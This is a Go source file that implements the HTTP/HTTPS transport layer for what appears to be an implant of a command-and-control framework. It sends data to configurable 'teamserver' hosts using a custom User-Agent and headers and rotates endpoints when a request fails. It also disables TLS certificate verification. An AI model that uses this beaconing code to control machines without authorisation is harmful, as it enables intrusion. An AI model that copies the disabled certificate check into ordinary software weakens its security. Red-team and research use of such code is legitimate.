package transport

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"
)

// Transport interface for different communication methods
type Transport interface {
	Send(data []byte) ([]byte, error)
	Close() error
}

// Host represents a teamserver host configuration
type Host struct {
	Address string
	Port    int
	Secure  bool
}

// Config holds transport configuration
type Config struct {
	Method    string
	UserAgent string
	Hosts     []Host
	URIs      []string
	Headers   map[string]string
	Timeout   time.Duration
}

// HTTPTransport implements HTTP/HTTPS communication
type HTTPTransport struct {
	config     *Config
	client     *http.Client
	currentHost int
	currentURI  int
}

// NewHTTPTransport creates a new HTTP transport instance
func NewHTTPTransport(config *Config) (*HTTPTransport, error) {
	if config.Timeout == 0 {
		config.Timeout = 30 * time.Second
	}

	// Create HTTP client with custom settings
	client := &http.Client{
		Timeout: config.Timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // For self-signed certificates
			},
		},
	}

	return &HTTPTransport{
		config: config,
		client: client,
	}, nil
}

// Send sends data to the teamserver and returns the response
func (h *HTTPTransport) Send(data []byte) ([]byte, error) {
	host := h.config.Hosts[h.currentHost]
	uri := h.config.URIs[h.currentURI]
	
	// Build URL
	scheme := "http"
	if host.Secure {
		scheme = "https"
	}
	url := fmt.Sprintf("%s://%s:%d%s", scheme, host.Address, host.Port, uri)

	// Create request
	req, err := http.NewRequest(h.config.Method, url, bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}

	// Set headers
	req.Header.Set("User-Agent", h.config.UserAgent)
	req.Header.Set("Content-Type", "application/octet-stream")
	
	for key, value := range h.config.Headers {
		req.Header.Set(key, value)
	}

	// Send request
	resp, err := h.client.Do(req)
	if err != nil {
		// Try next host/URI on failure
		h.rotateEndpoint()
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		h.rotateEndpoint()
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	// Read response
	responseData, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %v", err)
	}

	return responseData, nil
}

// rotateEndpoint switches to the next host/URI combination
func (h *HTTPTransport) rotateEndpoint() {
	h.currentURI = (h.currentURI + 1) % len(h.config.URIs)
	if h.currentURI == 0 {
		h.currentHost = (h.currentHost + 1) % len(h.config.Hosts)
	}
}

// Close closes the transport connection
func (h *HTTPTransport) Close() error {
	// HTTP transport doesn't need explicit cleanup
	return nil
}